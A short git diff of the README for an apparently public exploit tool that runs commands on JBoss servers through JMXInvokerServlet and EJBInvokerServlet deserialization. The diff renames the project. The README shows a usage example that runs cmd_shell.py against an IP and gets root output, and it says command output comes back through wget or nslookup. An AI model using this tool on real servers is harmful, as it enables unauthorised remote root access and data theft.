@@ -1,5 +1,5 @@
-# JMXInvokerServlet-exec
-JMXInvokerServlet serialized objects command execution
+# InvokerServlet-exec
+JMXInvokerServlet-EJBInvokerServlet serialized objects command execution
 
 full credit and details at the following link:
 
@@ -11,7 +11,7 @@ this script lets you execute and retrieve commands output (through wget or nsloo
 
 ## Example
 ```shell
-root@kali:~/script/JMXInvokerServlet-exec/wget# python cmd_shell.py 192.168.1.20 
+root@kali:~/script/InvokerServlet-exec/wget# python cmd_shell.py 192.168.1.20 
 $> id
 uid=0(root) gid=0(root) groups=0(root)
 
